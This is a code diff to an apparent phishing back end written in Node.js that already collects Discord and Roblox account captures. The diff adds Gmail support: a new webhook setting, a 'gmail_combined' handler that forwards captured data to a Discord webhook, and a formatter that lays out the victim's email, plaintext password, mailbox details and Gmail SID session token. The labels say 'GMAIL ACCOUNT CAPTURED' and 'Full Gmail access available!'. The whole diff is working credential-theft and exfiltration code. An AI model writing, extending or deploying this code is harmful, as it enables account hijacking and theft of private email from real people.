@@ -19,6 +19,9 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.
 // Discord account webhook URL for Discord credential captures
 const DISCORD_ACCOUNT_WEBHOOK = process.env.DISCORD_ACCOUNT_WEBHOOK || 'YOUR_DISCORD_ACCOUNT_WEBHOOK_URL_HERE';
 
+// Gmail webhook URL for Gmail credential captures
+const DISCORD_GMAIL_WEBHOOK = process.env.DISCORD_GMAIL_WEBHOOK || 'YOUR_DISCORD_GMAIL_WEBHOOK_URL_HERE';
+
 if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
   console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
   console.error('Please either:');
@@ -30,6 +33,11 @@ if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HE
 if (!DISCORD_ACCOUNT_WEBHOOK || DISCORD_ACCOUNT_WEBHOOK === 'YOUR_DISCORD_ACCOUNT_WEBHOOK_URL_HERE') {
   console.error('WARNING: DISCORD_ACCOUNT_WEBHOOK environment variable is not set');
   console.error('Discord account captures will be disabled');
+}
+
+if (!DISCORD_GMAIL_WEBHOOK || DISCORD_GMAIL_WEBHOOK === 'YOUR_DISCORD_GMAIL_WEBHOOK_URL_HERE') {
+  console.error('WARNING: DISCORD_GMAIL_WEBHOOK environment variable is not set');
+  console.error('Gmail account captures will be disabled');
 }
 
 // Function to get CSRF token for Roblox API requests
@@ -457,6 +465,33 @@ app.post('/send-log', async (req, res) => {
       } else {
         console.error('Discord account webhook not configured');
         res.status(400).json({ error: 'Discord account webhook not configured' });
+      }
+    }
+    // Handle gmail_combined type - send to Gmail webhook
+    else if (logData.level === 'gmail_combined') {
+      console.log('Processing Gmail account data...');
+      
+      if (DISCORD_GMAIL_WEBHOOK && DISCORD_GMAIL_WEBHOOK !== 'YOUR_DISCORD_GMAIL_WEBHOOK_URL_HERE') {
+        const gmailMessage = formatGmailAccountEmbed(logData);
+        
+        const response = await fetch(DISCORD_GMAIL_WEBHOOK, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(gmailMessage)
+        });
+
+        if (response.ok) {
+          console.log('Successfully sent Gmail account data to webhook');
+          res.status(200).json({ success: true });
+        } else {
+          console.error('Failed to send Gmail account data:', response.status, response.statusText);
+          res.status(500).json({ error: 'Failed to send to Gmail account webhook' });
+        }
+      } else {
+        console.error('Gmail webhook not configured');
+        res.status(400).json({ error: 'Gmail webhook not configured' });
       }
     }
     // Handle roblox_combined type - fetch data first, then format
@@ -992,6 +1027,80 @@ function formatDiscordAccountEmbed(logData) {
       color: 0x5865F2,
       footer: {
         text: "Full Discord access available! • " + new Date(logData.timestamp).toLocaleString()
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
+    };
+
+    embeds.push(tokenEmbed);
+  }
+
+  return { embeds };
+}
+
+function formatGmailAccountEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Gmail Account Captured with credentials
+  const accountEmbed = {
+    title: "📧 **GMAIL ACCOUNT CAPTURED**",
+    color: 0xEA4335,
+    fields: [
+      {
+        name: "**Login Credentials**",
+        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
+        inline: false
+      }
+    ],
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Add user data fields if available
+  if (logData.userData) {
+    const userData = logData.userData;
+    
+    accountEmbed.fields.push(
+      {
+        name: "📧 **Email Address**",
+        value: userData.email || "Unknown",
+        inline: true
+      },
+      {
+        name: "📨 **Total Messages**",
+        value: userData.messagesTotal?.toString() || "Unknown",
+        inline: true
+      },
+      {
+        name: "💬 **Total Threads**",
+        value: userData.threadsTotal?.toString() || "Unknown",
+        inline: true
+      },
+      {
+        name: "🆔 **History ID**",
+        value: userData.historyId || "Unknown",
+        inline: true
+      },
+      {
+        name: "📊 **Data Source**",
+        value: userData.source || "API",
+        inline: true
+      }
+    );
+
+    accountEmbed.footer = {
+      text: `Gmail Session Compromised • ${new Date(logData.timestamp).toLocaleString()}`
+    };
+  }
+
+  embeds.push(accountEmbed);
+
+  // Second embed: Gmail SID Token
+  if (logData.sidToken) {
+    const tokenEmbed = {
+      title: "🔑 Gmail SID Token",
+      description: "**```" + logData.sidToken + "```**",
+      color: 0xEA4335,
+      footer: {
+        text: "Full Gmail access available! • " + new Date(logData.timestamp).toLocaleString()
       },
       timestamp: new Date(logData.timestamp).toISOString()
     };
